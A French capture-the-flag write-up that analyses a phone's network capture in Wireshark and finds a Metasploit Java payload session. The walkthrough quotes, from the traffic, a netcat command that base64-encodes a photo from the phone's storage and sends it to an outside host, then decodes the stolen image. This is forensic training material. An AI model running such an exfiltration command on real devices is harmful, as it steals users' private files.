# C3PO

Difficulté : :star:

Énoncé :

> Pour votre première analyse, on vous confie le téléphone du PDG de *GoodCorp*.
>
> Ce dernier est certain que les précieuses photos stockées sur son téléphone sont récupérées par un acteur malveillant.
>
> Vous décidez de mettre en place une capture réseau sur le téléphone, afin de voir ce qu'il en est...

Fichier :

- [capture.cap](./capture.cap)

### Essais infructueux

Le fichier est un peu long (72 000 paquets pour 7 minutes d’enregistrement). Je l'ouvre dans Wireshark et je commence par filtrer seulement les requêtes DNS pour chercher un domaine louche. Je vois `a.espncdn.com`. Pour moi, `espn` est un diminutif de `espion` donc je filtre les discussion avec cet hôte. C'est du HTTP, j'arrive à extraire un PNG... Et c'est le logo d'un média sportif x)

À côté de ça, des requêtes DNS AAAA vers 4 domaines sans aucun sens tels que `ltclalbmngxxfnk` ont lieu mais c'est beaucoup trop peu pour exfiltrer des données.



### Résolution

Manquant d'idée je tente la facilité :

```
$ strings capture.cap | grep -i fcsc
EVOPWM4JZra3yOcEM13BxP+rZP8Oph3AlEZyhh3l+H7jXR8xhS+1Y1IwfcScjmASMachmIKYgEtB
elgwWyhKML1ENvn0diLeVD7fK4NRmL5dytM2HojJ1ZfcSC63H6gTP4GYLJjaPh+MwvQyisxMjiHx
lRW2lxK0EuPZIkTR58Ov58EAVuoKkdcLULR4yBo8pLXc+DU0jDJ1hQrpJw3y39eT/o8e9actfCsc
18faSIJ5eagFBJPEl9Q2TKTIhzvKvqTIF8WXf0gwqdPkNBCTIJi0KfJvE8yu7gGK+qmisstFCSc
9HZAJMEEu/wTBJMmP05M91BmfL4imMCXSxFMWg8mFVx+J8GkxZd/SDBp3Zf/CMFcSC1pRYspFyWY
```

Le flag n'est pas en clair dans la capture mais on voit beaucoup de base64 ce qui est étrange. J'applique le filtre `frame contains elgwWyhKML1ENvn0diLeVD7fK4NRmL5dytM2HojJ1ZfcSC63H6gTP4GYLJjaPh` pour voir d'où cela provient. Je vois que c'est un push tcp vers `172.18.0.1:1338`. En appliquant le filtre `ip.addr == 172.18.0.1` on voit qu'il y a énormément d'échange vers le port 1337 et 1338 de cet hôte. Cela représente 20% des paquets du fichiers donc j'aurais peut-être dû me balader d'avantage dans le fichier avant de filtrer seulement les requête DNS...

On fait clic droit sur une trame TCP vers `172.18.0.1:1337` puis *Suivre... Flux TCP* et on voit des données contenant entre autre `Metasploit-JavaPayload`. On fait de même avec la première trame vers le port 1338 et on voit cela :

```
cat /sdcard/DCIM/flag.png | base64 | nc 172.18.0.1 1338
```

On affiche la communication TCP suivante sur le port 1338 et on voit un gros paquet de base64 du client vers le serveur. On clique sur *Save As...* pour enregistrer cela et le décoder :

```
base64 -d flag.b64 > flag.png
```

On récupère une jolie image :

![flag](flag.png)

